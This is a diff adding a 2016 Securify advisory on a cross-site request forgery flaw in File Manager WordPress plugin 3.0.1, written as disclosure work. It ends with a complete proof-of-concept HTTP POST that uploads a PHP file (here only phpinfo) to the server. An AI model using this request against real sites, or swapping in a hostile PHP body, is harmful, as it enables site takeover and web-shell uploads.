@@ -1,0 +1,68 @@
+<!--
+Source: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_file_manager_wordpress_plugin.html
+
+Abstract
+A Cross-Site Request Forgery (CSRF) vulnerability was found in the File Manager WordPress Plugin. Among others, this issue can be used to upload arbitrary PHP files to the server.
+
+Contact
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160712-0029
+
+Tested versions
+This issue was successfully tested on the File Manager WordPress Plugin version 3.0.1.
+
+Fix
+There is currently no fix available.
+
+Introduction
+The File Manager WordPress Plugin is a file manager for WordPress which can be used to upload, delete, copy, move, rename, archive and extract files without the need for FTP. It was discovered that the File Manager WordPress Plugin is vulnerable to Cross-Site Request Forgery.
+
+Details
+The upload form used by the plugin has no protection against CSRF attacks. As a result an attacker can for example upload arbitrary PHP files to the server.
+
+Please note that the target user needs to be logged in.
+
+Proof of concept
+The target parameter holds a Base64-encoded destination path. By using the proof of concept request below a file named info.php is uploaded to the /wp-content/uploads/file-manager/ directory.
+
+When uploaded, this file can be requested from the outside as follows:
+http://<wp-server>/wp-content/uploads/file-manager/info.php
+
+Request:
+-->
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: <wp-server>
+Cookie: ALL_YOUR_WP_COOKIES
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------6427194103423794601262893907
+   
+-----------------------------6427194103423794601262893907
+Content-Disposition: form-data; name="cmd"
+   
+upload
+-----------------------------6427194103423794601262893907
+Content-Disposition: form-data; name="target"
+   
+l1_d3AtY29udGVudC91cGxvYWRzL2ZpbGUtbWFuYWdlcg
+-----------------------------6427194103423794601262893907
+Content-Disposition: form-data; name="suffix"
+   
+~
+-----------------------------6427194103423794601262893907
+Content-Disposition: form-data; name="action"
+   
+connector
+-----------------------------6427194103423794601262893907
+Content-Disposition: form-data; name="upload[]"; filename="info.php"
+Content-Type: text/php
+   
+<?php
+phpinfo();
+?>
+-----------------------------6427194103423794601262893907--
